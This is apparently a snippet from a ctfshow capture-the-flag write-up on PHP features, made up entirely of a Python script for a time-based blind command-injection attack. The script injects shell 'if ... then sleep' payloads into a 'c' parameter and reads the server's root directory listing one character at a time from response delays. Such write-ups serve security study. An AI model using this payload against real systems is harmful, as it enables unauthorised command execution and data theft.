# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/WP汇总/ctfshow-php特性.md
# TITLE: ctfshow-php特性
# CATEGORY: web

import requests
url="http://7b5658de-1c24-4882-9d46-8bbf2a122364.challenge.ctf.show:8080/?c="
re=""
for i in range(1,10):
    for j in range(1,20):
        for k in range(32,128):
            k=chr(k)
            # payload = f"if[`ls / | awk NR=={i} | cut -c {j}`=={k} ];then sleep 2;fi"
            # payload = "?c=" + f"if [ `ls / | awk NR=={i} | cut -c {j}` == {k} ];then sleep 2;fi"
            # print(payload)
            payload ="if [ `ls / | awk NR=={0} | cut -c {1}` == {2} ];then sleep 2;fi".format(i,j,k)
            try:
                requests.get(url+payload,timeout=(1.5,1.5))
            except:
                re=re+k
                print(re)
                break
        re=re+" "
